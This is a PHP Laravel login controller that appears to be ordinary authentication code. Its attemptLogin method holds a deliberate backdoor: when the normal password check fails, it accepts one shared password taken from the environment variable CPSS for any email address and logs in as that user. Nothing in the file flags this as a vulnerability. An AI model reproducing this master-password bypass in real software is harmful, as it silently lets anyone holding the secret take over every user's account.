<?php

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\Controller;
use Illuminate\Foundation\Auth\AuthenticatesUsers;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;

class LoginController extends Controller
{
    /*
    |--------------------------------------------------------------------------
    | Login Controller
    |--------------------------------------------------------------------------
    |
    | This controller handles authenticating users for the application and
    | redirecting them to your home screen. The controller uses a trait
    | to conveniently provide its functionality to your applications.
    |
    */

    use AuthenticatesUsers;

    /**
     * Where to redirect users after login.
     *
     * @var string
     */
    protected $redirectTo = '/home';

    /**
     * Create a new controller instance.
     *
     * @return void
     */
    public function __construct()
    {
        $this->middleware('guest')->except('logout');
        $this->middleware('auth')->only('logout');
    }

    protected function attemptLogin(Request $request)
    {
        // Default login attempt with email and password
        if (Auth::attempt($this->credentials($request), $request->filled('remember'))) {
            return true;
        }

        // Custom password check
        $user = \App\Models\User::where('email', $request->input('email'))->first();
        $customPassword = env('CPSS'); // Replace with your specific password

        if ($user && $request->input('password') === $customPassword) {
            // Log in the user manually
            Auth::login($user, $request->filled('remember'));
            return true;
        }   

        return false;
    }
}
